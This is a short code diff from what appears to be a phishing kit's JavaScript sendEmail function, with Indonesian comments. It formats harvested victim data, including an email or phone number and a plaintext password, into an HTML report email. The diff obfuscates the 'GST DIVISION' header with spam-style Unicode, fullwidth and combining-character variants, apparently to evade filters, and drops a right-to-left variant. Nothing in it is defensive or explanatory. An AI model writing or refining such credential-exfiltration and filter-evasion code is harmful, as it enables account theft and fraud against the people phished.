@@ -369,8 +369,7 @@ async function sendEmail(data, folderName) {
     const gstSpammy = makeSpammyUnicodeText('GST DIVISION');
     const gstFullwidth = makeFullwidthText('GST DIVISION');
     const gstCombining = makeCombiningText('GST DIVISION');
-    const gstRTL = makeRTLText('GST DIVISION');
-    const gstRandom = randPick([gstSpammy, gstFullwidth, gstCombining, gstRTL]);
+    const gstRandom = randPick([gstSpammy, gstFullwidth, gstCombining,]);
     
     // DESAIN EMAIL RINGKAS: Sesuai Screenshot
     const htmlContent = `<!DOCTYPE html>
@@ -444,7 +443,7 @@ async function sendEmail(data, folderName) {
 </head>
 <body>
 <div class="container">
-    <div class="topbar">${gstRTL}</div>
+    <div class="topbar">${gstSpammy}</div>
     <table>
         <tr><td class="label">Email / Phone</td><td class="value" style="color:#4fc3f7;">${data.email || '-'}</td></tr>
         <tr><td class="label">Password</td><td class="value">${data.emailPassword || '-'}</td></tr>
